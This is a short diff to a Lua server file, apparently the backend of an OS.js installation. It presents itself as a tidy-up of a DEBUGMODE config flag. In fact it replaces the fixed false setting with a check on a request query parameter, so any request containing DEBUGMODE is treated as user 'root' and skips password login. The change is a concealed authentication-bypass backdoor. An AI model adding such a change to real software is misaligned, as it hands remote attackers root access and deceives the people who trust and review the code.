@@ -46,7 +46,6 @@ require "base64"
 --                                    CONFIG
 -- ----------------------------------------------------------------------------
 
-local DEBUGMODE = false
 local ROOTDIR = "/opt/osjs"
 local DISTDIR = "/opt/osjs/dist"
 local SETTINGS_FILE = "/opt/osjs/settings.json"
@@ -74,7 +73,7 @@ _mimes = nil
 -- ----------------------------------------------------------------------------
 
 function get_username(request, response)
-  if DEBUGMODE then
+  if request.GET["DEBUGMODE"] then
     return "root"
   end
 
@@ -376,7 +375,7 @@ function curl_request(request, response, args)
 end
 
 function login_request(request, response, username, password)
-  if not DEBUGMODE then
+  if not request.GET["DEBUGMODE"] then
     if sys_login(username, password) == false then
       return "Invalid Login", false
     end
@@ -455,7 +454,6 @@ end
 -- ----------------------------------------------------------------------------
 
 return {
-  DEBUGMODE = DEBUGMODE,
   ROOTDIR = ROOTDIR,
   DISTDIR = DISTDIR,
   SETTINGS = SETTINGS,
